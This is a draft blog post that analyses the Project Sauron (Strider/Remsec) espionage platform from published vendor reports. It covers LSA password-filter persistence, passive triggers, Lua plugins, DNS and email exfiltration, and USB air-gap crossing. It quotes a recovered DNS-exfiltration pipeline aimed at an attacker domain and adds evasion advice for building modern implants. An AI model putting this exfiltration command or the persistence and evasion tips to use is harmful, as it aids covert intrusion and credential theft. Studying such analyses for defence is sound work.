---
title: "Project Sauron Architectural Lessons"
date: 2026-05-20T12:00:00+02:00
draft: true
tags: ["malware-analysis", "apt", "implant-design"]
description: "A structural read of Project Sauron and its design choices for modern post-exploitation tooling."
summary: "Architectural read of Sauron Strider Remsec and what it means for modern implant design."
---

## Why this one

There is a small set of public malware analyses that are worth reading more than once. The 2016 Kaspersky and Symantec writeups on Project Sauron, also tracked as Strider and Remsec, belong on that list. The campaign was active from at least June 2011 until mid-2016, hit roughly 30 organisations across government, military, telecoms, finance, and research, and went undiscovered for five years against environments that included Windows domain controllers running modern security stacks for the time.

What makes Sauron interesting is not any single trick. It is the consistency of the design. Every component answers the same question: how do we stay resident, stay quiet, and stay flexible without ever looking like the same operation twice. That question has not aged. The defenders have better tooling now, but the architectural pressures on an implant are the same.

This post is a structural read. The first part walks the design end to end, grounded in the Kaspersky paper and the Symantec writeup. The second part pulls out the lessons that still apply to anyone building or reasoning about modern post-exploitation tooling.

I am not claiming new analysis. The primary work was done a decade ago by the Kaspersky GReAT team and Symantec Security Response. What I am doing is reading their work through the lens of someone who thinks about implant architecture today, and pulling out the parts that still matter.

## The shape of the thing

Sauron is not a single binary. It is a platform with three layers that you should keep separate in your head:

1. A small loader that gets onto disk and into a sensitive process
2. A core runtime that lives in memory and does almost nothing on its own
3. A plugin ecosystem that does all the actual capability work, dispatched through a modified Lua interpreter

That separation is the single most important thing about the design. The loader is small enough to be replaced per target. The core is generic. The capability is data, not code, from the perspective of the host binary. None of those layers cares about the others beyond a thin interface.

This matters because most amateur C2 frameworks collapse all three layers into one beacon. The beacon does the loading, runs the comms, and contains the capability. That looks fine until you try to operate it against a competent EDR, at which point every capability you add inflates the implant's signature surface and every signature hit burns the whole loader.

Sauron's authors clearly understood this. The Kaspersky paper documents over 50 distinct plugin types, none of which is required to be present in the on-disk component.

## Layer one: persistence as a Windows native

The persistence story is the part that gets quoted the most, and rightly so. On compromised domain controllers, Sauron installs itself as a Windows LSA password filter.

LSA password filters are a legitimate Windows extensibility point. They exist so that administrators can enforce password complexity policies that go beyond the built-in rules. When a user or administrator sets a password, every registered password filter on the DC gets called with the cleartext password before it is hashed. This is by design.

Sauron registers itself as one of these filters. The result is that the implant's entry point runs every time a password is changed anywhere in the domain, with the cleartext value in a parameter. Persistence and a high-value collection capability collapse into a single Windows-native mechanism.

This is good design for several reasons. The filter is loaded by lsass.exe, which is exactly where you want to live on a DC. There is no scheduled task, no service entry pointing at a suspicious binary, no Run key. The registry value that registers the filter sits in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`, which is a well-known location but one that legitimate password filters also use. And the trigger condition, password change events, is high signal: you do not need to poll for credentials, the OS hands them to you.

The Lua install script for one of the implants, recovered by Kaspersky, walks through this registration explicitly, reading the existing `SecurityProviders` registry value, appending the implant DLL, and writing it back. The script also calls ftime to copy a timestamp from ntdll.dll onto the implant DLL so that the file's metadata matches a system file's metadata.

The lesson here is not "use LSA password filters". The lesson is that the most durable persistence mechanisms are the ones that abuse legitimate extensibility points and produce a useful side effect for the operator. Anything that is purely persistence, with no operational value, is dead weight that only exists to be detected.

## Layer two: the passive core

Once Sauron is loaded into lsass.exe via the password filter, the implant's core enters a passive state. Kaspersky describes the core modules as "sleeper cells" that display no activity of their own and wait for wake-up commands in incoming network traffic.

Passive backdoors are not new. The interesting choice is that Sauron's core does not initiate outbound C2 at all in the typical case. There is no beacon interval, no jitter sleep loop, no periodic check-in. The implant sits in memory and watches.

Activation is done through legitimate-looking network listeners that snoop on traffic the host process already sees. The Symantec writeup documents multiple variants: ICMP listeners, raw socket listeners, PCAP-based listeners, named pipe backdoors. The implant identifies a wake-up trigger inside otherwise normal traffic and then activates.

The defensive consequence of this is severe. A passive implant on a domain controller will not show up in netflow analysis looking for periodic outbound connections. It will not show up in beaconing detection algorithms because there is no beacon. It will not even show up in process anomaly detection in many cases, because the host process is lsass.exe and the listener is implemented using standard Windows networking APIs.

The cost the attacker pays is operational latency. You cannot push a command to a passive implant on demand. You have to wait for the implant to see traffic that triggers it. For a campaign measured in years, this is a perfectly acceptable tradeoff.

A second consequence of the passive design: if the implant never initiates outbound traffic, then there is no C2 server to take down. The C2 infrastructure mentioned in the Kaspersky paper, 28 domains across 11 IPs in the US and Europe, is used in some scenarios, but the core implant on the DC does not depend on it.

## Layer three: Lua as the capability boundary

The part of Sauron that gets the least credit is also the most interesting from an architecture perspective. The implant embeds a modified Lua interpreter and dispatches almost all actual capability through Lua scripts.

Lua was chosen for a reason. It is small, statically linkable, has a clean C embedding API, no JIT, and produces no runtime artifacts that look like a scripting engine to a casual reverse engineer. The Sauron authors modified the interpreter to support UTF-16 strings, which the Kaspersky paper notes was almost certainly a response to encountering non-Latin paths in real target environments after deployment.

The scripts are not toy automation. The recovered samples include install scripts that register the password filter, exfiltration scripts that base32-encode system info and tunnel it over DNS in 30-byte chunks, scripts that parse VEN configuration files to extract encryption keys, scripts that compose MIME-formatted email with the right User-Agent string to look like Thunderbird 2.0.0.9, and scripts that handle secure self-deletion.

The implication is that Sauron's actual operational logic, the part that contains "what we are stealing and how" for a given target, lives in scripts, not in compiled binaries. The compiled binaries are the runtime. The Lua scripts are the operation.

Kaspersky counted over 50 distinct plugin types in the platform. Each is a Lua module or a compiled helper exposed to Lua. The plugin set for one target is not the plugin set for another. This is what makes Sauron's per-target uniqueness sustainable at scale: the runtime is the same, the loaders are recompiled per target, the operational content is data.

The choice of Lua specifically over Python, JavaScript, or anything else with a runtime is worth dwelling on. Lua's interpreter loop is a simple bytecode dispatch. There is no JIT, no W^X violations, no allocation of executable memory at runtime. From the perspective of an EDR watching for suspicious memory allocations in the lsass.exe process, the Lua interpreter is indistinguishable from any other piece of computational logic. A Python interpreter, by contrast, brings a fairly fat runtime with allocation patterns that are recognisable.

The same reasoning rules out LuaJIT, which would otherwise be the faster option. LuaJIT requires writable-and-executable memory at runtime to emit native code. That is a deal-breaker inside lsass.exe in 2026. The original Lua reference interpreter has no such requirement.

## The Virtual File System

Sauron's plugins do not live on disk as normal files. They live inside a virtual file system (VFS) container, which is itself encrypted. Kaspersky describes both linear and two-level hierarchical VFS layouts, with one level handling injection, collection, and local caching, and the other handling exfiltration and network communications.

The VFS is interesting for two reasons. First, it means that file-based detection (any AV signature looking at on-disk plugin binaries) has nothing to scan: the plugins do not exist as files. Second, it gives the implant a stable internal namespace independent of the host file system. Lua scripts can reference plugins by VFS path without caring about where, or whether, those plugins exist on disk.

The Kaspersky paper documents pre-defined plugin packages called "blobs". The minimal `kblog.blob` package contains four modules (`detach`, `ilpsend`, `dir`, `skip`) for basic process injection and exfiltration. An extended variant adds `kgate`, `knatt`, and `wipe` for proxied exfiltration with secure deletion.

The VFS plus the Lua scripts plus the plugin blobs together give you something close to a real operating environment inside the implant. The operator does not interact with the host OS through Windows APIs from the C2; they interact with the Sauron runtime through Lua, and the runtime decides how to express those operations through Windows APIs.

## Network: encryption, transport diversity, and exfiltration paths

Network design in Sauron is built around two principles: never look the same twice, and never depend on any single channel.

Encryption is per-target. The Kaspersky paper notes that modules and network protocols use RC4, RC5, RC6, AES, and Salsa20 in different combinations. There is no single key, no single algorithm, no reusable IOC across deployments.

Transports include the obvious (HTTP, HTTPS, SMTP, TCP) and the less obvious (raw ICMP, raw UDP, DNS). The DNS exfiltration plugin, internally named `dext`, is documented in detail in the Kaspersky paper. The operator workflow looks like a Unix pipeline:

```
sinfo | basex -b 32url | dext -l 30 a.bikessport[.]com | nslu -
```

That reads as: collect system info, base32-url encode it, chunk it into 30-byte payloads inside DNS queries against the chosen subdomain, send them one at a time. The composition is small Unix-style tools that each do one thing, glued together with shell-like pipes inside Lua. That is a deliberate design choice: each tool is independently small enough to look unremarkable, and the composition lives in script.

The same `dext` plus `nslu` combination is also used for what the Kaspersky paper calls "real-time operation progress reporting" against a separate subdomain. The implant signals progress through DNS lookups of pre-arranged hostnames (`yhc9421.j.bikessport[.]com`, `yhc9422.j.bikessport[.]com`, etc.), each corresponding to a specific operational milestone. From the perspective of network defenders, that traffic looks like a DC making slightly weird DNS queries, which on a busy network is noise.

Email exfiltration is handled by constructing a complete MIME message in Lua, with a forged User-Agent header (`Thunderbird 2.0.0.9 (Windows/20071031)`), a benign subject line, and the actual stolen data as a base64-encoded attachment. The message is then sent directly to a Google mail server by IP, or, if that fails, through whatever SMTP server the target's encryption software is configured to use. The reuse of the target's own SMTP infrastructure is the kind of detail that demonstrates real operational discipline.

## Air-gapped exfiltration

The air-gap module is a useful tell about what the operators expected to find in target environments. Kaspersky documents a USB-based exfiltration mechanism that creates a hidden, encrypted partition at the end of a USB drive, in space that the partition table does not reference. The partition has its own VFS with In and Out directories.

Notably, Kaspersky did not recover a zero-day exploit for the air-gap crossing itself. The hidden partition only handles the data movement. There is something else that runs on the air-gapped machine to put data into the Out directory, and that something else has to get there somehow. The Kaspersky team's read is that a zero-day was likely deployed in a limited number of cases and never recovered, because the operators were careful about not deploying it broadly.

The architectural lesson is again about separation. The data-movement mechanism (the hidden partition) is generic and reusable. The exploit (the part that is expensive to develop and risky to deploy) is treated as a separately scoped capability that gets used only when needed.

## What Sauron got right that still matters

The Kaspersky paper closes with a list of what Sauron learned from previous APTs (Duqu's intranet C2s, Flame's Lua embedding, Equation's VFS and RC5/RC6 usage). What I want to do instead is pull out the design principles that survive the decade.

### Capability lives in the runtime, not in the loader

The single most important pattern in Sauron is that the loader is small and replaceable, the core is generic, and the actual operational logic is data dispatched at runtime through a scripting engine. Every modern serious red team framework has converged on some version of this. Cobalt Strike's BOF model, Mythic's payload-agnostic agent architecture, Sliver's extension system, Outflank's stage-2 designs: all of them push capability out of the implant and into runtime-loaded modules.

The reason this keeps coming back is that signature surface grows linearly with capability. If your implant contains the code for credential dumping, lateral movement, kerberoasting, and exfiltration, then any one of those getting fingerprinted burns the entire implant. If your implant only contains a loader and a runtime, the capability code can be replaced on demand without touching the resident component.

### Persistence should produce useful side effects

Sauron's LSA password filter is the textbook example. Persistence and credential collection are the same mechanism. Compare that to a service running a backdoor binary that does nothing useful for the operator until they connect to it. The service entry is pure cost, no operational benefit, and exists only to be found.

A modern equivalent is hijacking a legitimate Windows extensibility point that the operator actually wants to abuse: AppInit DLLs are dead, but COM hijacking, scheduled-task action substitution, AMSI provider registration, ETW provider registration, WMI event subscription, all combine "we are persistent here" with "we are also collecting something useful". The persistence story and the operational story should be one story.

### Passive C2 is underused

Passive backdoors are still rare in commercial offensive tooling. Most C2 frameworks beacon. Beaconing is operationally convenient (the operator can push tasks at any time) but it is also the single most fingerprintable behaviour an implant has. Beacon interval analysis, JA3/JA4 fingerprinting, periodic-connection detection, sleep mask analysis: all of these exist because beaconing exists.

A passive implant that triggers on a specific pattern in incoming traffic the host process already sees pays a real operational cost (latency) for a real defensive benefit (no outbound beaconing to detect). For long-haul access to high-value targets, the tradeoff is worth it. The reason this is rare in commercial tooling is partly because most red team engagements are too short to make passive C2 worth the operational pain, and partly because passive C2 requires the operator to think harder about the trigger surface. Neither of those is a reason it should not exist for real operations.

### Scripting engines are a design choice, not a convenience

There are two reasons to embed a scripting engine in an implant. The convenience reason is that operators can iterate on capability without rebuilding the implant. The architectural reason is that capability becomes data, which means it can be encrypted, fragmented, loaded on demand, and discarded after use without leaving artifacts.

Lua is the right choice for an implant runtime for the reasons Sauron's authors picked it: small, statically linkable, no JIT, no W^X requirement, clean C embedding, easy to extend. LuaJIT is faster but requires RWX memory and is therefore disqualified inside any sensitive process in 2026. Embedded Python brings too much weight and has allocation patterns that are recognisable. Custom scripting languages are a maintenance nightmare. The Sauron authors made the right call in 2011 and the answer has not changed.

The one thing I would do differently in 2026 is run Lua bytecode rather than Lua source. The Sauron Lua scripts that Kaspersky recovered were source files. Bytecode reduces signature surface (no recognisable Lua keywords in memory), defeats casual string-search analysis, and is trivially achievable by pre-compiling with `luac` and shipping the result.

### Per-target uniqueness is achievable through configuration, not through rewrites

Sauron's authors built one platform and configured it per target. That is the only way you produce 30 deployments where no two share IOCs without spending an absurd amount of engineering effort per target. The Lua scripts encode the per-target specifics. The compiled binaries are recompiled with different file names, sizes, timestamps, and embedded configs, but the core code is reused.

For anyone designing offensive tooling, this is the answer to "how do we avoid signature reuse". You do not avoid signature reuse by writing a new implant every time. You avoid it by making the implant configurable enough that the configuration carries the per-target uniqueness, and you treat compiled artifacts as build outputs rather than as source-of-truth.

### Network design should assume any single channel will be blocked

Sauron has at least five distinct exfiltration paths: direct HTTP/HTTPS to operator-controlled servers, DNS tunneling through dext, email via SMTP, intranet proxy chains through compromised internal servers, and USB-based air-gap crossing. No single network control blocks the operation. That is the right design posture against environments with mature network monitoring.

A modern equivalent would be a runtime that abstracts over transport, with the operator able to switch transports on demand without redeploying the implant. Several open-source frameworks do this poorly. The reason most do it poorly is that the transport abstraction has to be implemented at the runtime level, not at the beacon level, which means the implant has to contain enough generic networking logic to support multiple transports. That is fine if your runtime is well-factored. It is painful if your beacon is a monolith.

## Where Sauron's design shows its age

Not everything in Sauron translates cleanly to 2026. A few things have changed.

LSA password filter persistence on a DC is still a Windows extensibility point, but it is now a well-known offensive technique. Modern endpoint products on DCs alert on changes to Notification Packages in the LSA registry path. Server 2025 in default configurations is reasonably noisy when this kind of change happens. The technique works, but the noise floor is much lower than it was in 2011, and operating it requires either a very quiet write or a covering action that explains the change.

The static linking and on-disk format approaches Sauron used are recognisable to modern static analysis. The pattern of an unsigned DLL registered as a password filter, with imports that look "off" for that role, is a high-confidence signal for any decent EDR. The architectural pattern is still right; the specific implementation details would need updating.

The DNS exfiltration pattern (dext) is still operationally viable but the noise floor on suspicious DNS has dropped substantially. Length-bounded base32 payloads in subdomains are exactly what DNS tunneling detectors look for now. A modern implementation would need to look much less regular: variable encoding, domain rotation, query types other than A records, and ideally piggybacking on real DNS traffic the host already generates.

None of this invalidates the architecture. It updates the implementation.

## The summary, if you only read this part

Sauron's lasting value is not the specific techniques. It is the demonstration that a well-architected platform beats a clever single-shot implant every time. Specifically:

- Separate the loader, the runtime, and the capability. Treat each as independently replaceable.
- Make persistence do operational work. Anything that only persists is pure detection surface.
- Use a scripting engine to push capability out of compiled code. Lua, original interpreter, no JIT, bytecode at runtime.
- Default to passive C2 for long-haul access. Beacon only when you have to.
- Build network design around the assumption that any single channel will fail. Have at least three.
- Make per-target uniqueness a configuration property, not a rewrite property.

A decade after the original analyses, Sauron still reads as the design study that anyone serious about implant architecture should engage with. The defenders have improved. The architectural pressures have not.

## References

The technical claims in this post are drawn from two primary sources:

- Kaspersky GReAT team, *The ProjectSauron APT*, v1.02, August 2016. Available at media.kasperskycontenthub.com.
- Symantec Security Response, *Strider: Cyberespionage group turns eye of Sauron on targets*, August 2016. Available via Broadcom community archives.

Additional secondary references:

- MITRE ATT&CK entry for Remsec (S0125).
- Symantec ISTR Volume 22, 2017.

If you want to read one, read the Kaspersky paper. It is 22 pages and worth every page.
